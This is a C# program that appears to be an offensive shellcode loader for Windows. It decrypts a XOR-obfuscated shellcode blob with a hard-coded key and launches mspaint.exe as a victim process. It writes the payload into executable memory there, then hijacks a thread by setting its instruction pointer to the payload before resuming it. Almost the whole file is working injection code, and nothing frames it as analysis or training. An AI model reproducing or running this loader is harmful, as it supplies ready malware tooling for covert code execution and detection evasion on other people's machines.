using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;


class Program
{

    #region Types and Enums

    public enum CONTEXT_FLAGS : uint
    {
        CONTEXT_i386 = 0x10000,
        CONTEXT_i486 = 0x10000,   //  same as i386
        CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
        CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
        CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
        CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
        CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
        CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
        CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
        CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct FLOATING_SAVE_AREA
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public FLOATING_SAVE_AREA FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }

    // Next x64

    [StructLayout(LayoutKind.Sequential)]
    public struct M128A
    {
        public ulong High;
        public long Low;

        public override string ToString()
        {
            return string.Format("High:{0}, Low:{1}", this.High, this.Low);
        }
    }

    /// <summary>
    /// x64
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct XSAVE_FORMAT64
    {
        public ushort ControlWord;
        public ushort StatusWord;
        public byte TagWord;
        public byte Reserved1;
        public ushort ErrorOpcode;
        public uint ErrorOffset;
        public ushort ErrorSelector;
        public ushort Reserved2;
        public uint DataOffset;
        public ushort DataSelector;
        public ushort Reserved3;
        public uint MxCsr;
        public uint MxCsr_Mask;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public M128A[] FloatRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public M128A[] XmmRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
        public byte[] Reserved4;
    }

    /// <summary>
    /// x64
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;

        public CONTEXT_FLAGS ContextFlags;
        public uint MxCsr;

        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;

        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;

        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;

        public XSAVE_FORMAT64 DUMMYUNIONNAME;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public M128A[] VectorRegister;
        public ulong VectorControl;

        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }



    public delegate void ThreadStartDelegate();

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
/*
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
*/
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [Flags]
    public enum CreationFlags : uint
    {
        CreateSuspended = 0x00000004,
        DetachedProcess = 0x00000008,
        CreateNoWindow = 0x08000000,
        ExtendedStartupInfoPresent = 0x00080000
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }


    #endregion

    #region pinvoke sigs

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    // Get context of thread x64, in x64 application
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    // Get context of thread x64, in x64 application
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    // Get context of thread x64, in x64 application
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    // Get context of thread x64, in x64 application
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ResumeThread(IntPtr hThread);

    // Get context of thread x64, in x64 application
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, MemoryProtection flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      Int32 nSize,
      out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [MarshalAs(UnmanagedType.AsAny)] object lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
                                        uint dwSize, AllocationType flAllocationType,
                                        MemoryProtection flProtect);

    public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
    {
        return OpenProcess(flags, false, proc.Id);
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);


    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
       IntPtr lpThreadAttributes, uint dwStackSize, ThreadStartDelegate
       lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
       IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
       IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);




    //inner enum used only internally
    [Flags]
    private enum SnapshotFlags : uint
    {
        HeapList = 0x00000001,
        Process = 0x00000002,
        Thread = 0x00000004,
        Module = 0x00000008,
        Module32 = 0x00000010,
        Inherit = 0x80000000,
        All = 0x0000001F,
        NoHeaps = 0x40000000
    }
    //inner struct used only internally
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct THREADENTRY32
    {
        internal UInt32 dwSize;
        internal UInt32 cntUsage;
        internal UInt32 th32ThreadID;
        internal UInt32 th32OwnerProcessID;
        internal UInt32 tpBasePri; //LONG
        internal UInt32 tpDeltaPri; //LONG
        internal UInt32 dwFlags;
    }

    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200),
        SYNCHRONIZE = (0x00100000),
        STANDARD_RIGHTS_REQUIRED = 0x000f0000,
        THREAD_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3FF)
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll",SetLastError=true)]
    static extern int SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

/*
    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern IntPtr CreateToolhelp32Snapshot([In]UInt32 dwFlags, [In]UInt32 th32ProcessID);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32First([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32Next([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle([In] IntPtr hObject);
*/


    #endregion


    static void Main()
    {
        byte[] buf = new byte[] {0xa5,0x27,0xef,0x8b,0xa3,0x98,
            0xa1,0x63,0x65,0x48,0x20,0x32,0x2a,0x35,0x20,0x08,0x39,0x24,
            0x5e,0x81,0x15,0x29,0xe8,0x37,0x28,0x29,0xe8,0x39,0x7d,0x3a,
            0xd2,0x3d,0x4c,0x27,0xd8,0x02,0x31,0x2b,0x6a,0xff,0x2b,0x29,
            0x26,0x54,0xbb,0x11,0x5e,0xac,0xc3,0x6f,0x11,0x1d,0x61,0x49,
            0x68,0x20,0xa2,0xa2,0x68,0x33,0x58,0xae,0x8e,0x82,0x01,0x31,
            0x30,0x2b,0xee,0x1a,0x41,0xe8,0x29,0x59,0x3a,0x58,0xbf,0xe7,
            0xef,0xdb,0x70,0x61,0x63,0x2d,0xcd,0xa1,0x17,0x0c,0x2d,0x73,
            0x89,0x3f,0xe7,0x27,0x4b,0x34,0xea,0x23,0x45,0x01,0x60,0xb3,
            0x88,0x33,0x3a,0xa6,0xa6,0x2d,0xe4,0x67,0xf8,0x29,0x62,0xb3,
            0x05,0x50,0xaa,0x23,0x54,0xb2,0xf5,0x2e,0xad,0xa6,0x5e,0x31,
            0x60,0xa2,0x5d,0xa8,0x14,0x92,0x27,0x66,0x3e,0x7d,0x67,0x29,
            0x56,0x82,0x05,0xb9,0x3b,0x21,0xc3,0x21,0x47,0x22,0x64,0xa2,
            0x3f,0x2e,0xe7,0x63,0x1b,0x34,0xea,0x23,0x79,0x01,0x60,0xb3,
            0x2a,0xee,0x76,0xd1,0x27,0x6d,0xbf,0x12,0x28,0x20,0x3b,0x3b,
            0x11,0x3b,0x22,0x33,0x24,0x2b,0x18,0x35,0x24,0xec,0xbf,0x50,
            0x20,0x31,0x9a,0xa8,0x39,0x22,0x32,0x3f,0x3a,0xd2,0x7d,0x85,
            0x38,0xac,0x8f,0x9e,0x3e,0x2d,0xf2,0x60,0x63,0x6b,0x65,0x72,
            0x59,0x6f,0x6c,0x27,0xde,0xfd,0x60,0x62,0x65,0x48,0x20,0xd9,
            0x5a,0xee,0x1d,0xde,0x90,0xb9,0xd4,0xa3,0xc5,0xc3,0x35,0x24,
            0xf2,0xc7,0xf6,0xd6,0xf8,0x8d,0x8c,0x27,0xef,0xab,0x7b,0x4c,
            0x67,0x1f,0x6f,0xc8,0x9a,0x83,0x1e,0x60,0xc9,0x1e,0x7c,0x1e,
            0x00,0x39,0x70,0x38,0x22,0xec,0x92,0x9e,0xb6,0x08,0x04,0x1e,
            0x3a,0x41,0x09,0x17,0x36,0x70};


        byte[] keyBytes = Encoding.ASCII.GetBytes("YoloSpaceHacker2");
        byte[] shellcode = xor(buf, keyBytes);

        string victimImage = "c:\\windows\\system32\\mspaint.exe";

        const uint NORMAL_PRIORITY_CLASS = 0x0020;

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFO su = new STARTUPINFO();
        
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        tSec.nLength = Marshal.SizeOf(tSec);


        bool result = CreateProcess(victimImage, "", ref pSec, ref tSec, false, NORMAL_PRIORITY_CLASS, IntPtr.Zero, null, ref su, out pi);
        int processId = pi.dwProcessId;

        THREADENTRY32 threadEntry = new THREADENTRY32();
        CONTEXT64 context = new CONTEXT64();
        context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
        threadEntry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));

        IntPtr h_thread = IntPtr.Zero;
        IntPtr b_shellcode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, (AllocationType.Commit | AllocationType.Reserve), MemoryProtection.ExecuteReadWrite);

        IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
        WriteProcessMemory(pi.hProcess, b_shellcode, shellcode, shellcode.Length, out lpNumberOfBytesWritten);
        
        IntPtr h_snapshot = CreateToolhelp32Snapshot(SnapshotFlags.Thread, 0);
        Thread32First(h_snapshot, ref threadEntry);

        while (Thread32Next(h_snapshot, ref threadEntry))
        {
            if (threadEntry.th32OwnerProcessID == processId)
            {
                h_thread = OpenThread(ThreadAccess.THREAD_ALL_ACCESS , false, threadEntry.th32ThreadID);
                break;
            }
        }

        SuspendThread(h_thread);
        GetThreadContext(h_thread, ref context);
        context.Rip = (ulong)b_shellcode;
        SetThreadContext(h_thread, ref context);
        ResumeThread(h_thread);

        WaitForSingleObject(pi.hProcess, 0xffffffff);

    }


  private static byte[] xor(byte[] shell, byte[] KeyBytes)
  {
      for (int i = 0; i < shell.Length; i++)
      {
          shell[i] ^= KeyBytes[i % KeyBytes.Length];
      }
      return shell;
  }
}